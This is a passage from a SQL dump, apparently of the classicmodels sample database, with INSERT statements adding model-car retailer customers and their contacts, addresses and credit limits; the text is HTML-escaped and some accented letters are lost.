l\\\u0026#39;Europe\u0026#39;, null, \u0026#39;Versailles\u0026#39;, null, \u0026#39;78000\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1370\u0026#39;, \u0026#39;77900.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;259\u0026#39;, \u0026#39;Toms Spezialitten, Ltd\u0026#39;, \u0026#39;Pfalzheim\u0026#39;, \u0026#39;Henriette \u0026#39;, \u0026#39;0221-5554327\u0026#39;, \u0026#39;Mehrheimerstr. 369\u0026#39;, null, \u0026#39;Kln\u0026#39;, null, \u0026#39;50739\u0026#39;, \u0026#39;Germany\u0026#39;, \u0026#39;1504\u0026#39;, \u0026#39;120400.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;260\u0026#39;, \u0026#39;Royal Canadian Collectables, Ltd.\u0026#39;, \u0026#39;Lincoln\u0026#39;, \u0026#39;Elizabeth \u0026#39;, \u0026#39;(604) 555-4555\u0026#39;, \u0026#39;23 Tsawassen Blvd.\u0026#39;, null, \u0026#39;Tsawassen\u0026#39;, \u0026#39;BC\u0026#39;, \u0026#39;T2F 8M4\u0026#39;, \u0026#39;Canada\u0026#39;, \u0026#39;1323\u0026#39;, \u0026#39;89600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;273\u0026#39;, \u0026#39;Franken Gifts, Co\u0026#39;, \u0026#39;Franken\u0026#39;, \u0026#39;Peter \u0026#39;, \u0026#39;089-0877555\u0026#39;, \u0026#39;Berliner Platz 43\u0026#39;, null, \u0026#39;Mnchen\u0026#39;, null, \u0026#39;80805\u0026#39;, \u0026#39;Germany\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;276\u0026#39;, \u0026#39;Anna\\\u0026#39;s Decorations, Ltd\u0026#39;, \u0026#39;O\\\u0026#39;Hara\u0026#39;, \u0026#39;Anna\u0026#39;, \u0026#39;02 9936 8555\u0026#39;, \u0026#39;201 Miller Street\u0026#39;, \u0026#39;Level 15\u0026#39;, \u0026#39;North Sydney\u0026#39;, \u0026#39;NSW\u0026#39;, \u0026#39;2060\u0026#39;, \u0026#39;Australia\u0026#39;, \u0026#39;1611\u0026#39;, \u0026#39;107800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;278\u0026#39;, \u0026#39;Rovelli Gifts\u0026#39;, \u0026#39;Rovelli\u0026#39;, \u0026#39;Giovanni \u0026#39;, \u0026#39;035-640555\u0026#39;, \u0026#39;Via Ludovico il Moro 22\u0026#39;, null, \u0026#39;Bergamo\u0026#39;, null, \u0026#39;24100\u0026#39;, \u0026#39;Italy\u0026#39;, \u0026#39;1401\u0026#39;, \u0026#39;119600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;282\u0026#39;, \u0026#39;Souveniers And Things Co.\u0026#39;, \u0026#39;Huxley\u0026#39;, \u0026#39;Adrian\u0026#39;, \u0026#39;+61 2 9495 8555\u0026#39;, \u0026#39;Monitor Money Building\u0026#39;, \u0026#39;815 Pacific Hwy\u0026#39;, \u0026#39;Chatswood\u0026#39;, \u0026#39;NSW\u0026#39;, \u0026#39;2067\u0026#39;, \u0026#39;Australia\u0026#39;, \u0026#39;1611\u0026#39;, \u0026#39;93300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;286\u0026#39;, \u0026#39;Marta\\\u0026#39;s Replicas Co.\u0026#39;, \u0026#39;Hernandez\u0026#39;, \u0026#39;Marta\u0026#39;, \u0026#39;6175558555\u0026#39;, \u0026#39;39323 Spinnaker Dr.\u0026#39;, null, \u0026#39;Cambridge\u0026#39;, \u0026#39;MA\u0026#39;, \u0026#39;51247\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1216\u0026#39;, \u0026#39;123700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;293\u0026#39;, \u0026#39;BG\u0026amp;E Collectables\u0026#39;, \u0026#39;Harrison\u0026#39;, \u0026#39;Ed\u0026#39;, \u0026#39;+41 26 425 50 01\u0026#39;, \u0026#39;Rte des Arsenaux 41 \u0026#39;, null, \u0026#39;Fribourg\u0026#39;, null, \u0026#39;1700\u0026#39;, \u0026#39;Switzerland\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;298\u0026#39;, \u0026#39;Vida Sport, Ltd\u0026#39;, \u0026#39;Holz\u0026#39;, \u0026#39;Mihael\u0026#39;, \u0026#39;0897-034555\u0026#39;, \u0026#39;Grenzacherweg 237\u0026#39;, null, \u0026#39;Genve\u0026#39;, null, \u0026#39;1203\u0026#39;, \u0026#39;Switzerland\u0026#39;, \u0026#39;1702\u0026#39;, \u0026#39;141300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;299\u0026#39;, \u0026#39;Norway Gifts By Mail, Co.\u0026#39;, \u0026#39;Klaeboe\u0026#39;, \u0026#39;Jan\u0026#39;, \u0026#39;+47 2212 1555\u0026#39;, \u0026#39;Drammensveien 126A\u0026#39;, \u0026#39;PB 211 Sentrum\u0026#39;, \u0026#39;Oslo\u0026#39;, null, \u0026#39;N 0106\u0026#39;, \u0026#39;Norway \u0026#39;, \u0026#39;1504\u0026#39;, \u0026#39;95100.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;303\u0026#39;, \u0026#39;Schuyler Imports\u0026#39;, \u0026#39;Schuyler\u0026#39;, \u0026#39;Bradley\u0026#39;, \u0026#39;+31 20 491 9555\u0026#39;, \u0026#39;Kingsfordweg 151\u0026#39;, null, \u0026#39;Amsterdam\u0026#39;, null, \u0026#39;1043 GR\u0026#39;, \u0026#39;Netherlands\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;307\u0026#39;, \u0026#39;Der Hund Imports\u0026#39;, \u0026#39;Andersen\u0026#39;, \u0026#39;Mel\u0026#39;, \u0026#39;030-0074555\u0026#39;, \u0026#39;Obere Str. 57\u0026#39;, null, \u0026#39;Berlin\u0026#39;, null, \u0026#39;12209\u0026#39;, \u0026#39;Germany\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;311\u0026#39;, \u0026#39;Oulu Toy Supplies, Inc.\u0026#39;, \u0026#39;Koskitalo\u0026#39;, \u0026#39;Pirkko\u0026#39;, \u0026#39;981-443655\u0026#39;, \u0026#39;Torikatu 38\u0026#39;, null, \u0026#39;Oulu\u0026#39;, null, \u0026#39;90110\u0026#39;, \u0026#39;Finland\u0026#39;, \u0026#39;1501\u0026#39;, \u0026#39;90500.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;314\u0026#39;, \u0026#39;Petit Auto\u0026#39;, \u0026#39;Dewey\u0026#39;, \u0026#39;Catherine \u0026#39;, \u0026#39;(02) 5554 67\u0026#39;, \u0026#39;Rue Joseph-Bens 532\u0026#39;, null, \u0026#39;Bruxelles\u0026#39;, null, \u0026#39;B-1180\u0026#39;, \u0026#39;Belgium\u0026#39;, \u0026#39;1401\u0026#39;, \u0026#39;79900.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;319\u0026#39;, \u0026#39;Mini Classics\u0026#39;, \u0026#39;Frick\u0026#39;, \u0026#39;Steve\u0026#39;, \u0026#39;9145554562\u0026#39;, \u0026#39;3758 North Pendale Street\u0026#39;, null, \u0026#39;White Plains\u0026#39;, \u0026#39;NY\u0026#39;, \u0026#39;24067\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1323\u0026#39;, \u0026#39;102700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;320\u0026#39;, \u0026#39;Mini Creations Ltd.\u0026#39;, \u0026#39;Huang\u0026#39;, \u0026#39;Wing\u0026#39;, \u0026#39;5085559555\u0026#39;, \u0026#39;4575 Hillside Dr.\u0026#39;, null, \u0026#39;New Bedford\u0026#39;, \u0026#39;MA\u0026#39;, \u0026#39;50553\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1188\u0026#39;, \u0026#39;94500.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;321\u0026#39;, \u0026#39;Corporate Gift Ideas Co.\u0026#39;, \u0026#39;Brown\u0026#39;, \u0026#39;Julie\u0026#39;, \u0026#39;6505551386\u0026#39;, \u0026#39;7734 Strong St.\u0026#39;, null, \u0026#39;San Francisco\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;94217\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1165\u0026#39;, \u0026#39;105000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;323\u0026#39;, \u0026#39;Down Under Souveniers, Inc\u0026#39;, \u0026#39;Graham\u0026#39;, \u0026#39;Mike\u0026#39;, \u0026#39;+64 9 312 5555\u0026#39;, \u0026#39;162-164 Grafton Road\u0026#39;, \u0026#39;Level 2\u0026#39;, \u0026#39;Auckland \u0026#39;, null, null, \u0026#39;New Zealand\u0026#39;, \u0026#39;1612\u0026#39;, \u0026#39;88000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;324\u0026#39;, \u0026#39;Stylish Desk Decors, Co.\u0026#39;, \u0026#39;Brown\u0026#39;, \u0026#39;Ann \u0026#39;, \u0026#39;(171) 555-0297\u0026#39;, \u0026#39;35 King George\u0026#39;, null, \u0026#39;London\u0026#39;, null, \u0026#39;WX3 6FW\u0026#39;, \u0026#39;UK\u0026#39;, \u0026#39;1501\u0026#39;, \u0026#39;77000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;328\u0026#39;, \u0026#39;Tekni Collectables Inc.\u0026#39;, \u0026#39;Brown\u0026#39;, \u0026#39;William\u0026#39;, \u0026#39;2015559350\u0026#39;, \u0026#39;7476 Moss Rd.\u0026#39;, null, \u0026#39;Newark\u0026#39;, \u0026#39;NJ\u0026#39;, \u0026#39;94019\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1323\u0026#39;, \u0026#39;43000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;333\u0026#39;, \u0026#39;Australian Gift Network, Co\u0026#39;, \u0026#39;Calaghan\u0026#39;, \u0026#39;Ben\u0026#39;, \u0026#39;61-7-3844-6555\u0026#39;, \u0026#39;31 Duncan St. West End\u0026#39;, null, \u0026#39;South Brisbane\u0026#39;, \u0026#39;Queensland\u0026#39;, \u0026#39;4101\u0026#39;, \u0026#39;Australia\u0026#39;, \u0026#39;1611\u0026#39;, \u0026#39;51600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;334\u0026#39;, \u0026#39;Suominen Souveniers\u0026#39;, \u0026#39;Suominen\u0026#39;, \u0026#39;Kalle\u0026#39;, \u0026#39;+358 9 8045 555\u0026#39;, \u0026#39;Software Engineering Center\u0026#39;, \u0026#39;SEC Oy\u0026#39;, \u0026#39;Espoo\u0026#39;, null, \u0026#39;FIN-02271\u0026#39;, \u0026#39;Finland\u0026#39;, \u0026#39;1501\u0026#39;, \u0026#39;98800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;335\u0026#39;, \u0026#39;Cramer Spezialitten, Ltd\u0026#39;, \u0026#39;Cramer\u0026#39;, \u0026#39;Philip \u0026#39;, \u0026#39;0555-09555\u0026#39;, \u0026#39;Maubelstr. 90\u0026#39;, null, \u0026#39;Brandenburg\u0026#39;, null, \u0026#39;14776\u0026#39;, \u0026#39;Germany\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;339\u0026#39;, \u0026#39;Classic Gift Ideas, Inc\u0026#39;, \u0026#39;Cervantes\u0026#39;, \u0026#39;Francisca\u0026#39;, \u0026#39;2155554695\u0026#39;, \u0026#39;782 First Street\u0026#39;, null, \u0026#39;Philadelphia\u0026#39;, \u0026#39;PA\u0026#39;, \u0026#39;71270\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1188\u0026#39;, \u0026#39;81100.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;344\u0026#39;, \u0026#39;CAF Imports\u0026#39;, \u0026#39;Fernandez\u0026#39;, \u0026#39;Jesus\u0026#39;, \u0026#39;+34 913 728 555\u0026#39;, \u0026#39;Merchants House\u0026#39;, \u0026#39;27-30 Merchant\\\u0026#39;s Quay\u0026#39;, \u0026#39;Madrid\u0026#39;, null, \u0026#39;28023\u0026#39;, \u0026#39;Spain\u0026#39;, \u0026#39;1702\u0026#39;, \u0026#39;59600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;347\u0026#39;, \u0026#39;Men \\\u0026#39;R\\\u0026#39; US Retailers, Ltd.\u0026#39;, \u0026#39;Chandler\u0026#39;, \u0026#39;Brian\u0026#39;, \u0026#39;2155554369\u0026#39;, \u0026#39;6047 Douglas Av.\u0026#39;, null, \u0026#39;Los Angeles\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;91003\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1166\u0026#39;, \u0026#39;57700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;348\u0026#39;, \u0026#39;Asian Treasures, Inc.\u0026#39;, \u0026#39;McKenna\u0026#39;, \u0026#39;Patricia \u0026#39;, \u0026#39;2967 555\u0026#39;, \u0026#39;8 Johnstown Road\u0026#39;, null, \u0026#39;Cork\u0026#39;, \u0026#39;Co. Cork\u0026#39;, null, \u0026#39;Ireland\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;350\u0026#39;, \u0026#39;Marseille Mini Autos\u0026#39;, \u0026#39;Lebihan\u0026#39;, \u0026#39;Laurence \u0026#39;, \u0026#39;91.24.4555\u0026#39;, \u0026#39;12, rue des Bouchers\u0026#39;, null, \u0026#39;Marseille\u0026#39;, null, \u0026#39;13008\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1337\u0026#39;, \u0026#39;65000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;353\u0026#39;, \u0026#39;Reims Collectables\u0026#39;, \u0026#39;Henriot\u0026#39;, \u0026#39;Paul \u0026#39;, \u0026#39;26.47.1555\u0026#39;, \u0026#39;59 rue de l\\\u0026#39;Abbaye\u0026#39;, null, \u0026#39;Reims\u0026#39;, null, \u0026#39;51100\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1337\u0026#39;, \u0026#39;81100.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;356\u0026#39;, \u0026#39;SAR Distributors, Co\u0026#39;, \u0026#39;Kuger\u0026#39;, \u0026#39;Armand\u0026#39;, \u0026#39;+27 21 550 3555\u0026#39;, \u0026#39;1250 Pretorius Street\u0026#39;, null, \u0026#39;Hatfield\u0026#39;, \u0026#39;Pretoria\u0026#39;, \u0026#39;0028\u0026#39;, \u0026#39;South Africa\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;357\u0026#39;, \u0026#39;GiftsForHim.com\u0026#39;, \u0026#39;MacKinlay\u0026#39;, \u0026#39;Wales\u0026#39;, \u0026#39;64-9-3763555\u0026#39;, \u0026#39;199 Great North Road\u0026#39;, null, \u0026#39;Auckland\u0026#39;, null, null, \u0026#39;New Zealand\u0026#39;, \u0026#39;1612\u0026#39;, \u0026#39;77700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;361\u0026#39;, \u0026#39;Kommission Auto\u0026#39;, \u0026#39;Josephs\u0026#39;, \u0026#39;Karin\u0026#39;, \u0026#39;0251-555259\u0026#39;, \u0026#39;Luisenstr. 48\u0026#39;, null, \u0026#39;Minster\u0026#39;, null, \u0026#39;44087\u0026#39;, \u0026#39;Germany\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;362\u0026#39;, \u0026#39;Gifts4AllAges.com\u0026#39;, \u0026#39;Yoshido\u0026#39;, \u0026#39;Juri\u0026#39;, \u0026#39;6175559555\u0026#39;, \u0026#39;8616 Spinnaker Dr.\u0026#39;, null, \u0026#39;Boston\u0026#39;, \u0026#39;MA\u0026#39;, \u0026#39;51003\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1216\u0026#39;, \u0026#39;41900.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;363\u0026#39;, \u0026#39;Online Diecast Creations Co.\u0026#39;, \u0026#39;Young\u0026#39;, \u0026#39;Dorothy\u0026#39;, \u0026#39;6035558647\u0026#39;, \u0026#39;2304 Long Airport Avenue\u0026#39;, null, \u0026#39;Nashua\u0026#39;, \u0026#39;NH\u0026#39;, \u0026#39;62005\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1216\u0026#39;, \u0026#39;114200.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;369\u0026#39;, \u0026#39;Lisboa Souveniers, Inc\u0026#39;, \u0026#39;Rodriguez\u0026#39;, \u0026#39;Lino \u0026#39;, \u0026#39;(1) 354-2555\u0026#39;, \u0026#39;Jardim das rosas n. 32\u0026#39;, null, \u0026#39;Lisboa\u0026#39;, null, \u0026#39;1675\u0026#39;, \u0026#39;Portugal\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;376\u0026#39;, \u0026#39;Precious Collectables\u0026#39;, \u0026#39;Urs\u0026#39;, \u0026#39;Braun\u0026#39;, \u0026#39;0452-076555\u0026#39;, \u0026#39;Hauptstr. 29\u0026#39;, null, \u0026#39;Bern\u0026#39;, null, \u0026#39;3012\u0026#39;, \u0026#39;Switzerland\u0026#39;, \u0026#39;1702\u0026#39;, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;379\u0026#39;, \u0026#39;Collectables For Less Inc.\u0026#39;, \u0026#39;Nelson\u0026#39;, \u0026#39;Allen\u0026#39;, \u0026#39;6175558555\u0026#39;, \u0026#39;7825 Douglas Av.\u0026#39;, null, \u0026#39;Brickhaven\u0026#39;, \u0026#39;MA\u0026#39;, \u0026#39;58339\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1188\u0026#39;, \u0026#39;70700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;381\u0026#39;, \u0026#39;Royale Belge\u0026#39;, \u0026#39;Cartrain\u0026#39;, \u0026#39;Pascale \u0026#39;, \u0026#39;(071) 23 67 2555\u0026#39;, \u0026#39;Boulevard Tirou, 255\u0026#39;, null, \u0026#39;Charleroi\u0026#39;, null, \u0026#39;B-6000\u0026#39;, \u0026#39;Belgium\u0026#39;, \u0026#39;1401\u0026#39;, \u0026#39;23500.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;382\u0026#39;, \u0026#39;Salzburg Collectables\u0026#39;, \u0026#39;Pipps\u0026#39;, \u0026#39;Georg \u0026#39;, \u0026#39;6562-9555\u0026#39;, \u0026#39;Geislweg 14\u0026#39;, null, \u0026#39;Salzburg\u0026#39;, null, \u0026#39;5020\u0026#39;, \u0026#39;Austria\u0026#39;, \u0026#39;1401\u0026#39;, \u0026#39;71700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;385\u0026#39;, \u0026#39;Cruz \u0026amp; Sons Co.\u0026#39;, \u0026#39;Cruz\u0026#39;, \u0026#39;Arnold\u0026#39;, \u0026#39;+63 2 555 3587\u0026#39;, \u0026#39;15 McCallum Street\u0026#39;, \u0026#39;NatWest Center #13-03\u0026#39;, \u0026#39;Makati City\u0026#39;, null, \u0026#39;1227 MM\u0026#39;, \u0026#39;Philippines\u0026#39;, \u0026#39;1621\u0026#39;, \u0026#39;81500.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;386\u0026#39;, \u0026#39;L\\\u0026#39;ordine Souveniers\u0026#39;, \u0026#39;Moroni\u0026#39;, \u0026#39;Maurizio \u0026#39;, \u0026#39;0522-556555\u0026#39;, \u0026#39;Strada Provinciale 124\u0026#39;, null, \u0026#39;Reggio Emilia\u0026#39;, null, \u0026#39;42100\u0026#39;, \u0026#39;Italy\u0026#39;, \u0026#39;1401\u0026#39;, \u0026#39;121400.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;398\u0026#39;, \u0026#39;Tokyo Collectables, Ltd\u0026#39;, \u0026#39;Shimamura\u0026#39;, \u0026#39;Akiko\u0026#39;, \u0026#39;+81 3 3584 0555\u0026#39;, \u0026#39;2-2-8 Roppongi\u0026#39;, null, \u0026#39;Minato-ku\u0026#39;, \u0026#39;Tokyo\u0026#39;, \u0026#39;106-0032\u0026#39;, \u0026#39;Japan\u0026#39;, \u0026#39;1621\u0026#39;, \u0026#39;94400.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;406\u0026#39;, \u0026#39;Auto Canal+ Petit\u0026#39;, \u0026#39;Perrier\u0026#39;, \u0026#39;Dominique\u0026#39;, \u0026#39;(1) 47.55.6555\u0026#39;, \u0026#39;25, rue Lauriston\u0026#39;, null, \u0026#39;Paris\u0026#39;, null, \u0026#39;75016\u0026#39;, \u0026#39;France\u0026#39;, \u0026#39;1337\u0026#39;, \u0026#39;95000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;409\u0026#39;, \u0026#39;Stuttgart Collectable Exchange\u0026#39;, \u0026#39;Mller\u0026#39;, \u0026#39;Rita \u0026#39;, \u0026#39;0711-555361\u0026#39;, \u0026#39;Adenauerallee 900\u0026#39;, null, \u0026#39;Stuttgart\u0026#39;, null, \u0026#39;70563\u0026#39;, \u0026#39;Germany\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;412\u0026#39;, \u0026#39;Extreme Desk Decorations, Ltd\u0026#39;, \u0026#39;McRoy\u0026#39;, \u0026#39;Sarah\u0026#39;, \u0026#39;04 499 9555\u0026#39;, \u0026#39;101 Lambton Quay\u0026#39;, \u0026#39;Level 11\u0026#39;, \u0026#39;Wellington\u0026#39;, null, null, \u0026#39;New Zealand\u0026#39;, \u0026#39;1612\u0026#39;, \u0026#39;86800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;415\u0026#39;, \u0026#39;Bavarian Collectables Imports, Co.\u0026#39;, \u0026#39;Donnermeyer\u0026#39;, \u0026#39;Michael\u0026#39;, \u0026#39; +49 89 61 08 9555\u0026#39;, \u0026#39;Hansastr. 15\u0026#39;, null, \u0026#39;Munich\u0026#39;, null, \u0026#39;80686\u0026#39;, \u0026#39;Germany\u0026#39;, \u0026#39;1504\u0026#39;, \u0026#39;77000.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;424\u0026#39;, \u0026#39;Classic Legends Inc.\u0026#39;, \u0026#39;Hernandez\u0026#39;, \u0026#39;Maria\u0026#39;, \u0026#39;2125558493\u0026#39;, \u0026#39;5905 Pompton St.\u0026#39;, \u0026#39;Suite 750\u0026#39;, \u0026#39;NYC\u0026#39;, \u0026#39;NY\u0026#39;, \u0026#39;10022\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1286\u0026#39;, \u0026#39;67500.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;443\u0026#39;, \u0026#39;Feuer Online Stores, Inc\u0026#39;, \u0026#39;Feuer\u0026#39;, \u0026#39;Alexander \u0026#39;, \u0026#39;0342-555176\u0026#39;, \u0026#39;Heerstr. 22\u0026#39;, null, \u0026#39;Leipzig\u0026#39;, null, \u0026#39;04179\u0026#39;, \u0026#39;Germany\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;447\u0026#39;, \u0026#39;Gift Ideas Corp.\u0026#39;, \u0026#39;Lewis\u0026#39;, \u0026#39;Dan\u0026#39;, \u0026#39;2035554407\u0026#39;, \u0026#39;2440 Pompton St.\u0026#39;, null, \u0026#39;Glendale\u0026#39;, \u0026#39;CT\u0026#39;, \u0026#39;97561\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1323\u0026#39;, \u0026#39;49700.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;448\u0026#39;, \u0026#39;Scandinavian Gift Ideas\u0026#39;, \u0026#39;Larsson\u0026#39;, \u0026#39;Martha\u0026#39;, \u0026#39;0695-34 6555\u0026#39;, \u0026#39;kergatan 24\u0026#39;, null, \u0026#39;Brcke\u0026#39;, null, \u0026#39;S-844 67\u0026#39;, \u0026#39;Sweden\u0026#39;, \u0026#39;1504\u0026#39;, \u0026#39;116400.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;450\u0026#39;, \u0026#39;The Sharp Gifts Warehouse\u0026#39;, \u0026#39;Frick\u0026#39;, \u0026#39;Sue\u0026#39;, \u0026#39;4085553659\u0026#39;, \u0026#39;3086 Ingle Ln.\u0026#39;, null, \u0026#39;San Jose\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;94217\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1165\u0026#39;, \u0026#39;77600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;452\u0026#39;, \u0026#39;Mini Auto Werke\u0026#39;, \u0026#39;Mendel\u0026#39;, \u0026#39;Roland \u0026#39;, \u0026#39;7675-3555\u0026#39;, \u0026#39;Kirchgasse 6\u0026#39;, null, \u0026#39;Graz\u0026#39;, null, \u0026#39;8010\u0026#39;, \u0026#39;Austria\u0026#39;, \u0026#39;1401\u0026#39;, \u0026#39;45300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;455\u0026#39;, \u0026#39;Super Scale Inc.\u0026#39;, \u0026#39;Murphy\u0026#39;, \u0026#39;Leslie\u0026#39;, \u0026#39;2035559545\u0026#39;, \u0026#39;567 North Pendale Street\u0026#39;, null, \u0026#39;New Haven\u0026#39;, \u0026#39;CT\u0026#39;, \u0026#39;97823\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1286\u0026#39;, \u0026#39;95400.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;456\u0026#39;, \u0026#39;Microscale Inc.\u0026#39;, \u0026#39;Choi\u0026#39;, \u0026#39;Yu\u0026#39;, \u0026#39;2125551957\u0026#39;, \u0026#39;5290 North Pendale Street\u0026#39;, \u0026#39;Suite 200\u0026#39;, \u0026#39;NYC\u0026#39;, \u0026#39;NY\u0026#39;, \u0026#39;10022\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1286\u0026#39;, \u0026#39;39800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;458\u0026#39;, \u0026#39;Corrida Auto Replicas, Ltd\u0026#39;, \u0026#39;Sommer\u0026#39;, \u0026#39;Martn \u0026#39;, \u0026#39;(91) 555 22 82\u0026#39;, \u0026#39;C/ Araquil, 67\u0026#39;, null, \u0026#39;Madrid\u0026#39;, null, \u0026#39;28023\u0026#39;, \u0026#39;Spain\u0026#39;, \u0026#39;1702\u0026#39;, \u0026#39;104600.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;459\u0026#39;, \u0026#39;Warburg Exchange\u0026#39;, \u0026#39;Ottlieb\u0026#39;, \u0026#39;Sven \u0026#39;, \u0026#39;0241-039123\u0026#39;, \u0026#39;Walserweg 21\u0026#39;, null, \u0026#39;Aachen\u0026#39;, null, \u0026#39;52066\u0026#39;, \u0026#39;Germany\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;462\u0026#39;, \u0026#39;FunGiftIdeas.com\u0026#39;, \u0026#39;Benitez\u0026#39;, \u0026#39;Violeta\u0026#39;, \u0026#39;5085552555\u0026#39;, \u0026#39;1785 First Street\u0026#39;, null, \u0026#39;New Bedford\u0026#39;, \u0026#39;MA\u0026#39;, \u0026#39;50553\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1216\u0026#39;, \u0026#39;85800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;465\u0026#39;, \u0026#39;Anton Designs, Ltd.\u0026#39;, \u0026#39;Anton\u0026#39;, \u0026#39;Carmen\u0026#39;, \u0026#39;+34 913 728555\u0026#39;, \u0026#39;c/ Gobelas, 19-1 Urb. La Florida\u0026#39;, null, \u0026#39;Madrid\u0026#39;, null, \u0026#39;28023\u0026#39;, \u0026#39;Spain\u0026#39;, null, \u0026#39;0.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;471\u0026#39;, \u0026#39;Australian Collectables, Ltd\u0026#39;, \u0026#39;Clenahan\u0026#39;, \u0026#39;Sean\u0026#39;, \u0026#39;61-9-3844-6555\u0026#39;, \u0026#39;7 Allen Street\u0026#39;, null, \u0026#39;Glen Waverly\u0026#39;, \u0026#39;Victoria\u0026#39;, \u0026#39;3150\u0026#39;, \u0026#39;Australia\u0026#39;, \u0026#39;1611\u0026#39;, \u0026#39;60300.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;473\u0026#39;, \u0026#39;Frau da Collezione\u0026#39;, \u0026#39;Ricotti\u0026#39;, \u0026#39;Franco\u0026#39;, \u0026#39;+39 022515555\u0026#39;, \u0026#39;20093 Cologno Monzese\u0026#39;, \u0026#39;Alessandro Volta 16\u0026#39;, \u0026#39;Milan\u0026#39;, null, null, \u0026#39;Italy\u0026#39;, \u0026#39;1401\u0026#39;, \u0026#39;34800.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;475\u0026#39;, \u0026#39;West Coast Collectables Co.\u0026#39;, \u0026#39;Thompson\u0026#39;, \u0026#39;Steve\u0026#39;, \u0026#39;3105553722\u0026#39;, \u0026#39;3675 Furth Circle\u0026#39;, null, \u0026#39;Burbank\u0026#39;, \u0026#39;CA\u0026#39;, \u0026#39;94019\u0026#39;, \u0026#39;USA\u0026#39;, \u0026#39;1166\u0026#39;, \u0026#39;55400.00\u0026#39;); INSERT INTO `customers` VALUES (\u0026#39;477\u0026#39;, \u0026#39;Mit Vergngen 